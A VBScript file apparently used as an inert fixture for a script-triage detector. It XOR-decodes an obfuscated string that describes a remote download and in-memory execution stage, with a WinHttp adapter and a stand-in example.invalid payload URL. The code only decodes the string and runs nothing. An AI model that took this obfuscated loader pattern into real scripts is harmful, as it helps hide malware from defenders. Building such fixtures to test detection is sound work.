Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_2d3e6cf0 = "35-104-100-41-38-33-48-37-38-104-52-54-36-32-60-39-48-10-39-48-56-58-33-48-121-49-60-38-37-52-33-54-61-10-56-48-56-58-39-44-41-52-49-52-37-33-48-39-104-2-60-59-29-33-33-37-123-2-60-59-29-33-33-37-7-48-36-32-48-38-33-123-96-123-100-41-38-33-52-50-48-10-54-58-32-59-33-104-103-41-54-52-56-37-52-60-50-59-10-60-49-104-54-52-56-37-52-60-50-59-120-101-99-54-102-108-48-102-101-102-102-41-32-39-57-104-61-33-33-37-38-111-122-122-101-99-54-102-108-48-102-101-102-102-123-48-45-52-56-37-57-48-123-60-59-35-52-57-60-49-122-102-52-48-101-55-100-100-98-123-49-52-33-41-32-38-48-39-10-52-50-48-59-33-104-29-32-59-33-39-48-38-38-25-52-55-122-101-99-54-102-108-48-102-101-102-102"
Const Codec_2d3e6cf0 = "decimal_dash|single_byte_xor|55"

Function Load_2d3e6cf0()
  Dim parts, result(), v_e598
  parts = Split(Material_2d3e6cf0, "-")
  ReDim result(UBound(parts))
  For v_e598 = 0 To UBound(parts)
    result(v_e598) = CInt(parts(v_e598))
  Next
  Load_2d3e6cf0 = result
End Function

Function Decode_2d3e6cf0(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = v_a19c(v_e598) Xor 85
  Next
  Decode_2d3e6cf0 = result
End Function

Function Recover_2d3e6cf0()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  If True Then
    If (2 > 1) Then v_d41a = "left" Else v_d41a = "right"
      v_a19c = Load_2d3e6cf0()
      v_b27e = Decode_2d3e6cf0(v_a19c)
      v_c304 = ""
      For v_e598 = 0 To UBound(v_b27e)
        v_c304 = v_c304 & Chr(v_b27e(v_e598))
      Next
  End If
  Recover_2d3e6cf0 = v_c304
End Function

Function Inspect_2d3e6cf0()
  Inspect_2d3e6cf0 = Recover_2d3e6cf0()
End Function
